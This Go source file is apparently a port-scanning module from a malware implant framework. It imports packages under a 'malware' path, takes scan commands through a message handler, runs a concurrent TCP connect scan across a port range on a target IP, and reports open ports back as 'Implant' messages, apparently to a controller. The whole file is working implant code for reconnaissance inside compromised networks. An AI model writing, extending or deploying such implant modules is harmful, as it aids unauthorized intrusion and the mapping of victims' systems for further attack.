package portscan

import (
	"context"
	"fmt"
	"malware/common/messages"
	"malware/common/types"
	"net"
	"strings"
	"sync"
	"time"

	"golang.org/x/sync/semaphore"
)

type state struct {
	scanning bool
	lock     *semaphore.Weighted
}

type settings struct {
	state *state
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{scanning: false, lock: semaphore.NewWeighted(100)}
	return settings{&state}
}

func ScanPort(ip string, port uint32, timeout time.Duration) bool {
	target := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		if strings.Contains(err.Error(), "too many open files") {
			time.Sleep(timeout)
			return ScanPort(ip, port, timeout)
		}
		return false
	}

	conn.Close()
	return true
}

func (settings settings) portscan(portscan *messages.PortScan, callback func(*messages.CheckCmdRequest)) {
	if portscan.Cancel {
		settings.state.scanning = false
	} else {
		if settings.state.scanning {
			callback(messages.Implant_error(settings.ID(), types.ERR_PORTSCAN_RUNNING))
		} else {
			settings.state.scanning = true
			wg := sync.WaitGroup{}

			for port := portscan.StartPort; port <= portscan.EndPort && settings.state.scanning; port++ {
				settings.state.lock.Acquire(context.TODO(), 1)
				wg.Add(1)

				go func(port uint32) {
					defer settings.state.lock.Release(1)
					defer wg.Done()

					if ScanPort(portscan.Ip, port, time.Second/4) {
						callback(messages.Implant_portscan_in_progress(settings.ID(), port))
					}
				}(port)
			}

			// Wait for threads to join
			wg.Wait()
			settings.state.scanning = false
			callback(messages.Implant_portscan_complete(settings.ID()))
		}
	}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
	portscan := message.GetPortscan()
	if portscan == nil {
		return false
	}

	go settings.portscan(portscan, callback)
	return true
}

// Init the state of this module
func (settings settings) Init() {
}

func (settings settings) Shutdown() {
}

func (settings) ID() string { return "portscan" }
